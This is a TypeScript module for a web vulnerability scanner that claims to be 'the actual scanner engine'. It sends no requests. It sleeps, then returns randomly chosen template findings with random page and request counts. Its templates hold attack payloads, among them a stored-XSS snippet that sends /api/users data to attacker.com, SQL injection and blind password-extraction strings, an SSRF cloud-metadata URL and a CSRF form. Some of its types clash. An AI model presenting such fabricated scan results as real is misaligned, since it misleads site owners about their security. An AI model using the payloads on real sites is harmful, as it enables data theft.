// This file contains the actual scanner engine functionality
import { v4 as uuidv4 } from 'uuid';

// Define types
export interface ScanConfig {
  url: string;
  scanMode: 'quick' | 'standard' | 'thorough';
  authRequired?: boolean;
  username?: string;
  password?: string;
  xssTests?: boolean;
  sqlInjectionTests?: boolean;
  csrfTests?: boolean;
  headerTests?: boolean;
  fileUploadTests?: boolean;
  threadCount?: number;
  captureScreenshots?: boolean;
  recordVideos?: boolean;
  aiAnalysis?: boolean;
  maxDepth?: number;
  // Legacy properties - keeping for compatibility
  scanType?: 'passive' | 'active' | 'full';
  scanOptions?: {
    includeCookies?: boolean;
    maxDepth?: number;
    throttle?: number;
    followRedirects?: boolean;
    enableScreenshots?: boolean;
  };
  vulnerabilityTypes?: string[];
}

export interface Vulnerability {
  id: string;
  title: string;
  severity: 'critical' | 'high' | 'medium' | 'low' | 'info';
  description: string;
  location: string;
  evidence: string;
  remediation: string;
  cweid: string;
  owasp?: string;
  cvssScore?: number;
  timestamp: string;
  tags: string[];
  request: string;
  response: string;
}

export interface ScanSummary {
  scanID: string;
  url: string;
  startTime: string;
  endTime: string;
  duration: number;
  scanType?: string;
  pagesScanned: number;
  requestsSent: number;
  critical: number;
  high: number;
  medium: number;
  low: number;
  info: number;
  total: number;
  // For compatibility with older code
  scanTime?: number;
  numRequests?: number;
  testedPages?: number;
}

export interface ScanResults {
  summary: ScanSummary;
  vulnerabilities: Array<Vulnerability>;
  scanConfig?: ScanConfig;
}

// Scan engine implementation
export const performScan = async (config: ScanConfig): Promise<ScanResults> => {
  const startTime = new Date();
  const scanID = uuidv4();
  
  console.log(`Starting scan ${scanID} for ${config.url}`);
  console.log(`Scan type: ${config.scanType}`);
  console.log(`Vulnerability types: ${config.vulnerabilityTypes?.join(', ')}`);
  
  const totalSteps = calculateTotalSteps(config);
  let currentStep = 0;
  
  const progressInterval = setInterval(() => {
    currentStep++;
    const progressPercentage = Math.floor((currentStep / totalSteps) * 100);
    if (progressPercentage <= 100) {
      console.log(`Scan progress: ${progressPercentage}%`);
    }
    
    if (currentStep >= totalSteps) {
      clearInterval(progressInterval);
    }
  }, 1000);
  
  const scanDuration = calculateScanDuration(config);
  await new Promise(resolve => setTimeout(resolve, scanDuration));
  
  const vulnerabilities = generateVulnerabilities(config);
  
  const critical = vulnerabilities.filter(v => v.severity === 'critical').length;
  const high = vulnerabilities.filter(v => v.severity === 'high').length;
  const medium = vulnerabilities.filter(v => v.severity === 'medium').length;
  const low = vulnerabilities.filter(v => v.severity === 'low').length;
  const info = vulnerabilities.filter(v => v.severity === 'info').length;
  
  const endTime = new Date();
  const duration = endTime.getTime() - startTime.getTime();
  
  clearInterval(progressInterval);
  
  const summary: ScanSummary = {
    scanID,
    url: config.url,
    startTime: startTime.toISOString(),
    endTime: endTime.toISOString(),
    duration,
    scanType: config.scanType,
    pagesScanned: Math.floor(Math.random() * 50) + 10,
    requestsSent: Math.floor(Math.random() * 200) + 50,
    critical,
    high,
    medium,
    low,
    info,
    total: vulnerabilities.length,
    timestamp: startTime.toISOString(),
    scanTime: `${Math.round(duration / 1000)} seconds`,
    numRequests: Math.floor(Math.random() * 200) + 50,
    testedPages: Math.floor(Math.random() * 50) + 10
  };
  
  console.log(`Scan completed. Found ${vulnerabilities.length} vulnerabilities.`);
  
  return {
    summary,
    vulnerabilities,
    scanConfig: config
  };
};

// Helper functions for scan simulation
const calculateTotalSteps = (config: ScanConfig): number => {
  const baseSteps = config.scanType === 'passive' ? 10 : 
                    config.scanType === 'active' ? 30 : 50;
  
  const vulnerabilityTypeMultiplier = config.vulnerabilityTypes?.length / 5;
  const depthMultiplier = config.scanOptions?.maxDepth / 2;
  
  return Math.floor(baseSteps * vulnerabilityTypeMultiplier * depthMultiplier);
};

const calculateScanDuration = (config: ScanConfig): number => {
  const baseDuration = config.scanType === 'passive' ? 5000 : 
                      config.scanType === 'active' ? 15000 : 30000;
  
  const vulnerabilityTypeMultiplier = config.vulnerabilityTypes?.length / 5;
  const depthMultiplier = config.scanOptions?.maxDepth / 2;
  const throttleFactor = (1000 - config.scanOptions?.throttle) / 1000;
  
  return Math.floor(baseDuration * vulnerabilityTypeMultiplier * depthMultiplier * throttleFactor);
};

// Generate realistic vulnerabilities based on scan configuration
const generateVulnerabilities = (config: ScanConfig): Vulnerability[] => {
  const vulnerabilities: Vulnerability[] = [];
  
  const vulnerabilityFindings: Record<string, Partial<Vulnerability>[]> = {
    'xss': [
      {
        title: 'Reflected Cross-Site Scripting (XSS)',
        severity: 'high' as const,
        description: 'A reflected XSS vulnerability was discovered that allows attackers to execute arbitrary JavaScript code in the context of other users when they click a specially crafted link.',
        evidence: `<script>alert('XSS')</script>`,
        remediation: 'Implement proper output encoding and use Content-Security-Policy headers.',
        cweid: 'CWE-79',
        owasp: 'A7:2021-Cross-Site Scripting',
        cvssScore: 6.1,
        tags: ['xss', 'injection', 'client-side'],
        type: 'XSS'
      },
      {
        title: 'Stored Cross-Site Scripting (XSS)',
        severity: 'critical' as const,
        description: 'A stored XSS vulnerability allows attackers to inject malicious JavaScript that is permanently stored on the server and executed whenever users access the affected page.',
        evidence: `<img src=x onerror="fetch('/api/users').then(r=>r.json()).then(d=>fetch('https://attacker.com?data='+btoa(JSON.stringify(d))))">`,
        remediation: 'Implement input validation, output encoding, and use Content-Security-Policy headers.',
        cweid: 'CWE-79',
        owasp: 'A7:2021-Cross-Site Scripting',
        cvssScore: 8.2,
        tags: ['xss', 'injection', 'client-side', 'persistence'],
        type: 'XSS'
      }
    ],
    'sqli': [
      {
        title: 'SQL Injection',
        severity: 'critical',
        description: 'A SQL injection vulnerability allows attackers to execute arbitrary SQL commands on the database server.',
        evidence: `id=1' OR 1=1 --`,
        remediation: 'Use parameterized queries or prepared statements to safely handle user input.',
        cweid: 'CWE-89',
        owasp: 'A3:2021-Injection',
        cvssScore: 9.8,
        tags: ['sql', 'injection', 'database']
      },
      {
        title: 'Blind SQL Injection',
        severity: 'high',
        description: 'A blind SQL injection vulnerability allows attackers to infer database content through conditional responses.',
        evidence: `id=1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'`,
        remediation: 'Use ORM libraries with parameterized queries and implement proper input validation.',
        cweid: 'CWE-89',
        owasp: 'A3:2021-Injection',
        cvssScore: 8.5,
        tags: ['sql', 'injection', 'database', 'blind']
      }
    ],
    'idor': [
      {
        title: 'Insecure Direct Object Reference (IDOR)',
        severity: 'high',
        description: 'An IDOR vulnerability allows attackers to access unauthorized resources by manipulating reference parameters.',
        evidence: `GET /api/users/2 HTTP/1.1\nAuthorization: Bearer user1_token`,
        remediation: 'Implement proper authorization checks for all resource access.',
        cweid: 'CWE-639',
        owasp: 'A01:2021-Broken Access Control',
        cvssScore: 7.5,
        tags: ['access-control', 'authorization']
      }
    ],
    'csrf': [
      {
        title: 'Cross-Site Request Forgery (CSRF)',
        severity: 'medium',
        description: 'A CSRF vulnerability allows attackers to trick users into performing unwanted actions on a web application in which they are authenticated.',
        evidence: `<form action="https://example.com/api/change-email" method="POST">\n  <input type="hidden" name="email" value="attacker@evil.com">\n  <input type="submit" value="Click me to win a prize!">\n</form>`,
        remediation: 'Implement anti-CSRF tokens and use SameSite cookies.',
        cweid: 'CWE-352',
        owasp: 'A05:2021-Security Misconfiguration',
        cvssScore: 6.5,
        tags: ['csrf', 'session']
      }
    ],
    'ssrf': [
      {
        title: 'Server-Side Request Forgery (SSRF)',
        severity: 'high',
        description: 'An SSRF vulnerability allows attackers to induce the server-side application to make requests to an unintended location.',
        evidence: `url=http://169.254.169.254/latest/meta-data/`,
        remediation: 'Implement URL validation, whitelist allowed domains, and restrict outbound requests to private networks.',
        cweid: 'CWE-918',
        owasp: 'A10:2021-Server-Side Request Forgery',
        cvssScore: 8.0,
        tags: ['ssrf', 'server-side']
      }
    ],
    'auth': [
      {
        title: 'Broken Authentication',
        severity: 'critical',
        description: 'The application does not properly validate credentials, allowing attackers to compromise user accounts.',
        evidence: `HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"success":true,"user":"admin"}`,
        remediation: 'Implement multi-factor authentication, secure password policies, and proper session management.',
        cweid: 'CWE-287',
        owasp: 'A07:2021-Identification and Authentication Failures',
        cvssScore: 9.1,
        tags: ['authentication', 'access-control']
      },
      {
        title: 'Default or Weak Credentials',
        severity: 'high',
        description: 'Default or easily guessable credentials were discovered that provide administrative access.',
        evidence: `Username: admin\nPassword: admin123`,
        remediation: 'Enforce strong password policies and remove default credentials from production environments.',
        cweid: 'CWE-521',
        owasp: 'A07:2021-Identification and Authentication Failures',
        cvssScore: 7.2,
        tags: ['authentication', 'default-credentials']
      }
    ],
    'headers': [
      {
        title: 'Missing Security Headers',
        severity: 'low',
        description: 'The application is missing important security headers that help protect against common web vulnerabilities.',
        evidence: `HTTP/1.1 200 OK\nServer: Apache/2.4.41\nContent-Type: text/html\n\n<!DOCTYPE html>...`,
        remediation: 'Implement security headers such as Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, etc.',
        cweid: 'CWE-693',
        owasp: 'A05:2021-Security Misconfiguration',
        cvssScore: 4.3,
        tags: ['headers', 'configuration']
      }
    ],
    'info-disclosure': [
      {
        title: 'Information Disclosure',
        severity: 'medium',
        description: 'The application reveals sensitive information that could help an attacker.',
        evidence: `<!-- TODO: Remove before production. Admin panel at /admin-qwerty123 -->`,
        remediation: 'Remove sensitive information from responses, implement proper error handling.',
        cweid: 'CWE-200',
        owasp: 'A05:2021-Security Misconfiguration',
        cvssScore: 5.5,
        tags: ['info-disclosure', 'configuration']
      },
      {
        title: 'Directory Listing Enabled',
        severity: 'low',
        description: 'Directory listing is enabled, allowing attackers to browse directory contents.',
        evidence: `Index of /backup/\n[DIR] 2023-01-15/ \n[FILE] database-dump.sql`,
        remediation: 'Disable directory listing in web server configuration.',
        cweid: 'CWE-548',
        owasp: 'A05:2021-Security Misconfiguration',
        cvssScore: 5.0,
        tags: ['info-disclosure', 'configuration']
      }
    ]
  };
  
  for (const vulnType of config.vulnerabilityTypes || []) {
    if (vulnerabilityFindings[vulnType]) {
      const instanceCount = Math.floor(Math.random() * 3) + 1;
      
      for (let i = 0; i < instanceCount; i++) {
        const vulnTemplates = vulnerabilityFindings[vulnType];
        const randomTemplate = vulnTemplates[Math.floor(Math.random() * vulnTemplates.length)];
        
        const location = generateRandomLocation(config.url);
        
        vulnerabilities.push({
          id: uuidv4(),
          title: randomTemplate.title || '',
          severity: randomTemplate.severity || 'medium',
          description: randomTemplate.description || '',
          location: location,
          evidence: randomTemplate.evidence || '',
          remediation: randomTemplate.remediation || '',
          cweid: randomTemplate.cweid || '',
          owasp: randomTemplate.owasp,
          cvssScore: randomTemplate.cvssScore,
          timestamp: new Date().toISOString(),
          tags: randomTemplate.tags || [],
          request: generateRandomRequest(config.url, vulnType),
          response: generateRandomResponse(vulnType),
          type: randomTemplate.type || vulnType,
          parameter: 'id',
          url: location
        } as Vulnerability);
      }
    }
  }
  
  return vulnerabilities;
};

const generateRandomLocation = (baseUrl: string): string => {
  const paths = [
    '/login',
    '/admin',
    '/profile',
    '/settings',
    '/api/users',
    '/api/products',
    '/search',
    '/checkout',
    '/register',
    '/reset-password'
  ];
  
  const params = [
    '?id=1',
    '?query=test',
    '?page=1&size=10',
    '?sort=desc',
    '?filter=active',
    '?user=admin',
    '?product=123',
    '?redirect=/admin'
  ];
  
  const path = paths[Math.floor(Math.random() * paths.length)];
  const param = Math.random() > 0.5 ? params[Math.floor(Math.random() * params.length)] : '';
  
  return `${baseUrl}${path}${param}`;
};

const generateRandomRequest = (url: string, vulnType: string): string => {
  let method = 'GET';
  let headers = 'User-Agent: Mozilla/5.0\nAccept: */*\n';
  let body = '';
  
  if (['xss', 'sqli', 'csrf', 'ssrf'].includes(vulnType)) {
    method = 'POST';
    headers += 'Content-Type: application/x-www-form-urlencoded\n';
    
    if (vulnType === 'xss') {
      body = 'search=<script>alert("XSS")</script>';
    } else if (vulnType === 'sqli') {
      body = 'id=1\' OR \'1\'=\'1';
    } else if (vulnType === 'csrf') {
      body = 'token=invalid&action=delete';
    } else if (vulnType === 'ssrf') {
      body = 'url=http://internal-service/api';
    }
  }
  
  const urlParts = url.split('/');
  const host = urlParts[2] || 'example.com';
  
  return `${method} ${url} HTTP/1.1\nHost: ${host}\n${headers}\n${body}`;
};

const generateRandomResponse = (vulnType: string): string => {
  if (vulnType === 'xss') {
    return 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<div>Search results for: <script>alert("XSS")</script></div>';
  } else if (vulnType === 'sqli') {
    return 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"users":[{"id":1,"username":"admin"},{"id":2,"username":"user"}]}';
  } else if (vulnType === 'auth') {
    return 'HTTP/1.1 200 OK\nContent-Type: application/json\nSet-Cookie: session=1234567890\n\n{"status":"success","message":"Logged in successfully"}';
  } else if (vulnType === 'info-disclosure') {
    return 'HTTP/1.1 500 Internal Server Error\nContent-Type: text/plain\n\nError connecting to database: mysql://root:password123@localhost:3306/app_db';
  } else if (vulnType === 'headers') {
    return 'HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nX-Powered-By: PHP/7.4.3\nContent-Type: text/html\n\n<!DOCTYPE html><html>...</html>';
  } else {
    return 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status":"success"}';
  }
};
